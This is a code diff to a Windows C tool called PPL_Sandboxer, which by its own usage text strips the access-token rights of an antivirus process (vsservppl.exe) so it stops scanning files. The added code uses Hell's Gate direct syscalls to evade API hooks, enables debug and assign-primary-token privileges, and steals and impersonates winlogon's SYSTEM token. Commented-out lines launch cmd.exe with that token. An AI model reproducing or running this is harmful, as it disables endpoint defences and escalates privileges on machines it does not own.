@@ -23,6 +23,8 @@ void PopulateVxTable(PVX_TABLE table, PIMAGE_EXPORT_DIRECTORY pImageExportDirect
     table->NtAdjustPrivilegesToken.dwHash = 0x354E8E728234EF1C;
     table->NtSetInformationToken.dwHash = 0x2C7DADE1428736A9;
     table->NtOpenProcessToken.dwHash = 0xC42B90FE8B421C48; // for OpenProcessTokenEx 0x7D53CACE643A57A5;
+    table->NtDuplicateToken.dwHash = 0xAE14EBDBEDB9CCF2;
+    table->NtSetInformationThread.dwHash = 0xBC336A0992F335A0;
 
     //9618ee0c
     //0xffffffff9618ee0c
@@ -37,6 +39,10 @@ void PopulateVxTable(PVX_TABLE table, PIMAGE_EXPORT_DIRECTORY pImageExportDirect
         return -1;
     if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtSetInformationToken))
         return -1;
+    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtDuplicateToken))
+        return -1;
+    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtSetInformationThread))
+        return -1;
 }
 
 
@@ -45,6 +51,7 @@ BOOL EnableDebugPrivilege(PVX_TABLE table)
     HANDLE hToken = NULL;
     HANDLE hCurrProcess = GetCurrentProcess();
     LUID sedebugnameValue = { 0 };
+    LUID seAssignPrimaryTokenPrivilege = { 0 };
     TOKEN_PRIVILEGES tkp = { 0 };
     NTSTATUS status = 0;
 
@@ -66,6 +73,15 @@ BOOL EnableDebugPrivilege(PVX_TABLE table)
     tkp.Privileges[0].Luid = sedebugnameValue;
     tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
+
+    if (!LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &seAssignPrimaryTokenPrivilege))
+    {
+        CloseHandle(hToken);
+        return FALSE;
+    }
+    tkp.PrivilegeCount = 2;
+    tkp.Privileges[1].Luid = seAssignPrimaryTokenPrivilege;
+    tkp.Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
 
     //NtAdjustPrivilegesToken || ZwAdjustPrivilegesToken
     HellsGate(table->NtAdjustPrivilegesToken.wSystemCall);
@@ -100,6 +116,7 @@ int getpid(LPCWSTR procname) {
         printf("[+] Got target proc PID: %d\n", procPID);
     }
 
+    CloseHandle(snapshot);
     return procPID;
 }
 
@@ -160,19 +177,67 @@ PPEB GetPointerToPEB() {
     return pPEB;
 }
 
+HANDLE impersonateToken(int pid, PVX_TABLE table) {
+
+    NTSTATUS status = 0;
+    HANDLE hImpersonationTarget = NULL;
+    HANDLE hImpersonationToken = NULL;
+    OBJECT_ATTRIBUTES objAttrs = { 0 };
+    CLIENT_ID clientId = { 0 };
+    clientId.UniqueProcess = ULongToHandle(pid);
+
+    HellsGate(table->NtOpenProcess.wSystemCall);
+    status = HellDescent(&hImpersonationTarget, PROCESS_QUERY_INFORMATION, &objAttrs, &clientId);
+    if (status) {
+        printf("[-] Could not open handle of impersonation target w/ PID: %d. Err Code %lx\n", pid, status);
+        return NULL;
+    }
+
+    HellsGate(table->NtOpenProcessToken.wSystemCall);
+    status = HellDescent(hImpersonationTarget, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &hImpersonationToken);
+    if (status) {
+        printf("[-] Failed to open token handle of impersonation target w/ PID: %d. Err Code %lx\n", pid, status);
+        return NULL;
+    }
+
+    OBJECT_ATTRIBUTES objAttrs2 = { 0 };
+    SECURITY_QUALITY_OF_SERVICE SQOS = { 0 };
+    SQOS.ImpersonationLevel = SecurityImpersonation;
+    SQOS.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
+    SQOS.ContextTrackingMode = 0;
+    SQOS.EffectiveOnly = FALSE;
+
+    objAttrs2.SecurityQualityOfService = &SQOS;
+    InitializeObjectAttributes(&objAttrs2, NULL, 0, NULL, NULL);
+    HANDLE duppedToken = NULL;
+   
+    HellsGate(table->NtDuplicateToken.wSystemCall);
+    status = HellDescent(hImpersonationToken, TOKEN_ALL_ACCESS, &objAttrs2, FALSE, TokenPrimary, &duppedToken); //using TokenImpersonate works for setting thread context to token. TokenPrimary works for functions like ImpersonateLoggedOnUser etc.
+    if (status) {
+        printf("[-] Failed to duplicate token of process w/ PID: %d. Err Code %lx\n", pid, status);
+        return NULL;
+    }
+
+    //if (!DuplicateTokenEx(hImpersonationToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duppedToken))
+    //{
+    //    DWORD LastError = GetLastError();
+    //    wprintf(L"Error: Could not duplicate process token [%d]\n", LastError);
+    //    return 1;
+    //}
+
+    return duppedToken;
+}
+
 
 int main(int argc, char** argv)
 {
 
     if (argc < 2) {
-        printf("[*] Usage: PPL_Sandboxer vsserv.exe\n");
+        printf("[*] Usage: PPL_Sandboxer vsservppl.exe\n");
         printf("[*] This tool is used to strip the security rights of access tokens for targeted processes.\n");
         printf("[*] By removing the the access token rights, the process no longer has the rights to say scan newly uploaded files on disk. I.E. removes AV functionality.\n");
         exit(-1);
     }
-
-    //printf("First argument: %s\n", argv[0]);
-    printf("Second argument: %s\n", argv[1]);
 
     //obtain pointer to PEB.
     PPEB pPEB = GetPointerToPEB();
@@ -194,9 +259,55 @@ int main(int argc, char** argv)
     LUID sedebugnameValue;
     EnableDebugPrivilege(&table);
 
+    printf("[*] Attmpting Token Impersonation of winlogon service.\n");
+    wchar_t impersonationTarget[80] = L"winlogon.exe";
+    int impersonationPid = getpid(impersonationTarget);
+    HANDLE hImpersonatedProcToken = NULL;
+
+    hImpersonatedProcToken = impersonateToken(impersonationPid, &table);
+    
+    //for testing the impersonated token w/o native api magic.
+    // TODO:
+    //THIS IS UNSAFE - DOES NOT BYPASS API HOOKS. No idea why me calling NtSetInformationThread and ImpersonateLoggedOnuser doesn't work for me. It seems to be pretty similar I even opened it up in a debugger.
+    //if you're reading this and have debugged this problem before. Help me out here. The api works by calling ImpersonateLoggedonUser using my currently dupped token. -> checks the permissions of that token -> duplicates it again -> calls NtSetInformationThread.
+    BOOL res = FALSE;
+    //res = SetThreadToken(NULL, hImpersonatedProcToken);
+    res = ImpersonateLoggedOnUser(hImpersonatedProcToken); // this works to impersonate SYSTEM & set processes to untrusted within the currently running context. However, I need to figure out a way to eumulate this using NtSetInformationThread b/c that's the native API that gets called.
+    if (!res) {
+        DWORD lasterror;
+        lasterror = GetLastError();
+        wprintf(L"SetThreadToken: %d", lasterror);
+        return -1;
+    }
+
+    //advapi32.dll setThreadToken -> kernelbase -> NtSetInformationThread.
+    //advapi32.dll ImpersonateLoggedOnUser -> kernelbase -> NtSetInformationThread.
+    NTSTATUS status = 0;
+    //HellsGate(table.NtSetInformationThread.wSystemCall);
+    //status = HellDescent(GetCurrentThread(), ThreadImpersonationToken, (PVOID)&hImpersonatedProcToken, 8);
+    //if (status) {
+    //    printf("[-] Failed to impersonate token on current thread. Err Code %lx\n", status);
+    //    return 0;
+    //}
+    printf("[*] Successfully impersonated winlogon service.\n");
+
+    //for testing the success of token duplication w/o using native API magic.
+    // works for creating a new process as system.
+    //STARTUPINFO si = { 0 };
+    //PROCESS_INFORMATION pi = { 0 };
+    //BOOL ret = FALSE;
+    //CreateProcessWithTokenW(hImpersonatedProcToken, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+    //if (!ret)
+    //{
+    //    DWORD lastError;
+    //    lastError = GetLastError();
+    //    wprintf(L"CreateProcessWithTokenW: %d\n", lastError);
+    //    return 1;
+    //}
+
     wchar_t procname[80] = { 0 };
     
-    MultiByteToWideChar(CP_UTF8, 0, argv[1], strlen(argv[1]), procname, 80);
+    MultiByteToWideChar(CP_UTF8, 0, argv[1], strlen(argv[1]), procname, 80);//"vsserv.exe", procname, 80);//strlen(argv[1]), procname, 80);
     int pid = getpid(procname);
 
 
@@ -207,7 +318,7 @@ int main(int argc, char** argv)
     //NtOpenProcess
    // HANDLE pHandle = NULL;
     //NtOpenProcess()
-    NTSTATUS status = 0;
+    
     HANDLE hVicProc = NULL;
     CLIENT_ID ClientId;
     OBJECT_ATTRIBUTES objectAttributes = { 0 };
@@ -230,8 +341,6 @@ int main(int argc, char** argv)
     else {
         printf("[-] Failed to open Process Handle\n");
     }
-
-    // printf("%p\n", phandle);
 
     HANDLE ptoken;
     HellsGate(table.NtOpenProcessToken.wSystemCall);
@@ -312,6 +421,7 @@ int main(int argc, char** argv)
 
     CloseHandle(ptoken);
     CloseHandle(hVicProc);
+    CloseHandle(hImpersonatedProcToken);
 
     return 0;
 }
